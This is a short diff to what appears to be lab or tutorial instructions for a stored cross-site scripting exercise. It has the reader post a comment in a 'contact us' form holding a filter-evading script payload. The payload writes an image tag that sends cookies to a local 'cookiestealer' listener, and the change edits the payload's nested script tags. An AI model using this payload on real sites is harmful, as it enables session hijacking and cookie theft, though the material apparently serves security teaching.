@@ -10,6 +10,6 @@
 	```python3 3rd_party_cookie_stealer.py```
 3. Post the following comment in the section *contact us*:
 
-	```<<script> foo</script>document.write(' <img src="http://localhost:3000/cookiestealer /> ');</script>script>```	
+	```<<script> foo</script>script>document.write(' <img src="http://localhost:3000/cookiestealer /> ');</script>script>```	
 
 On the terminal running *3rd_party_cookie_stealer.py* the cookies should be printed
